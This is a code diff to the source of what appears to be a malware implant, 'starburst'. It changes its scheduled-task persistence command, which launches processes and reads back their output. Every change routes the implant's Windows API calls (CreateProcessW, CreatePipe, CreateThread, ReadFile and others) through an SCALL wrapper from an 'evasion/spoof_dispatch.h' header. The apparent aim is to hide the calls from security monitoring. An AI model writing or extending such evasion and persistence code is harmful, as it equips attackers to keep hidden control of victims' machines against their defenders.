@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_PERSIST_SCHTASK
 
@@ -21,9 +22,9 @@ static auto WINAPI declfn schtask_thread_fn( LPVOID param ) -> DWORD {
     auto ctx  = static_cast<SchtaskJobCtx*>( param );
     auto& inst = *ctx->inst;
 
-    inst.kernel32.WaitForSingleObject( ctx->h_process, 30000 );
-    inst.kernel32.TerminateProcess( ctx->h_process, 0 );
-    inst.kernel32.CloseHandle( ctx->h_process );
+    SCALL( inst, kernel32.WaitForSingleObject, ctx->h_process, 30000 );
+    SCALL( inst, kernel32.TerminateProcess, ctx->h_process, 0 );
+    SCALL( inst, kernel32.CloseHandle, ctx->h_process );
 
     uint8_t* output = nullptr;
     uint32_t out_len = 0;
@@ -34,7 +35,7 @@ static auto WINAPI declfn schtask_thread_fn( LPVOID param ) -> DWORD {
 
     while ( true ) {
         bytes_read = 0;
-        BOOL read_ok = inst.kernel32.ReadFile(
+        BOOL read_ok = (BOOL)SCALL( inst, kernel32.ReadFile,
             ctx->h_read, read_buf, sizeof(read_buf), &bytes_read, nullptr );
         if ( !read_ok || bytes_read == 0 ) break;
 
@@ -49,7 +50,7 @@ static auto WINAPI declfn schtask_thread_fn( LPVOID param ) -> DWORD {
         out_len += bytes_read;
     }
 
-    inst.kernel32.CloseHandle( ctx->h_read );
+    SCALL( inst, kernel32.CloseHandle, ctx->h_read );
 
     if ( output ) {
         output[out_len] = '\0';
@@ -152,7 +153,7 @@ auto declfn starburst::cmd_persist_schtask(
 
     // Convert to wide for CreateProcessW
     wchar_t wcmdline[2048] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmdline, -1, wcmdline, 2048 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, cmdline, -1, wcmdline, 2048 );
 
     SECURITY_ATTRIBUTES sa = {};
     sa.nLength        = sizeof( SECURITY_ATTRIBUTES );
@@ -161,7 +162,7 @@ auto declfn starburst::cmd_persist_schtask(
     HANDLE h_read  = nullptr;
     HANDLE h_write = nullptr;
 
-    if ( !inst.kernel32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) {
+    if ( !SCALL( inst, kernel32.CreatePipe, &h_read, &h_write, &sa, 0 ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CreatePipe failed" ) ) );
         return;
@@ -176,7 +177,7 @@ auto declfn starburst::cmd_persist_schtask(
 
     PROCESS_INFORMATION pi = {};
 
-    BOOL ok = inst.kernel32.CreateProcessW(
+    BOOL ok = (BOOL)SCALL( inst, kernel32.CreateProcessW,
         nullptr, wcmdline,
         nullptr, nullptr,
         TRUE,
@@ -185,22 +186,22 @@ auto declfn starburst::cmd_persist_schtask(
         &si, &pi
     );
 
-    inst.kernel32.CloseHandle( h_write );
+    SCALL( inst, kernel32.CloseHandle, h_write );
 
     if ( !ok ) {
-        inst.kernel32.CloseHandle( h_read );
+        SCALL( inst, kernel32.CloseHandle, h_read );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CreateProcessW failed" ) ) );
         return;
     }
 
-    inst.kernel32.CloseHandle( pi.hThread );
+    SCALL( inst, kernel32.CloseHandle, pi.hThread );
 
     auto ctx = static_cast<SchtaskJobCtx*>( inst.heap_alloc( sizeof(SchtaskJobCtx) ) );
     if ( !ctx ) {
-        inst.kernel32.TerminateProcess( pi.hProcess, 0 );
-        inst.kernel32.CloseHandle( pi.hProcess );
-        inst.kernel32.CloseHandle( h_read );
+        SCALL( inst, kernel32.TerminateProcess, pi.hProcess, 0 );
+        SCALL( inst, kernel32.CloseHandle, pi.hProcess );
+        SCALL( inst, kernel32.CloseHandle, h_read );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -212,15 +213,15 @@ auto declfn starburst::cmd_persist_schtask(
     memory::copy( ctx->task_uuid, task_uuid, 36 );
     ctx->task_uuid[36] = '\0';
 
-    HANDLE h_thread = inst.kernel32.CreateThread(
+    HANDLE h_thread = (HANDLE)SCALL( inst, kernel32.CreateThread,
         nullptr, 0,
         reinterpret_cast<LPTHREAD_START_ROUTINE>( schtask_thread_fn ),
         ctx, 0, nullptr );
 
     if ( !h_thread ) {
-        inst.kernel32.TerminateProcess( pi.hProcess, 0 );
-        inst.kernel32.CloseHandle( pi.hProcess );
-        inst.kernel32.CloseHandle( h_read );
+        SCALL( inst, kernel32.TerminateProcess, pi.hProcess, 0 );
+        SCALL( inst, kernel32.CloseHandle, pi.hProcess );
+        SCALL( inst, kernel32.CloseHandle, h_read );
         inst.heap_free( ctx );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CreateThread failed" ) ) );
@@ -234,7 +235,7 @@ auto declfn starburst::cmd_persist_schtask(
         job.h_thread = h_thread;
         job.active   = true;
     } else {
-        inst.kernel32.CloseHandle( h_thread );
+        SCALL( inst, kernel32.CloseHandle, h_thread );
     }
 }
 
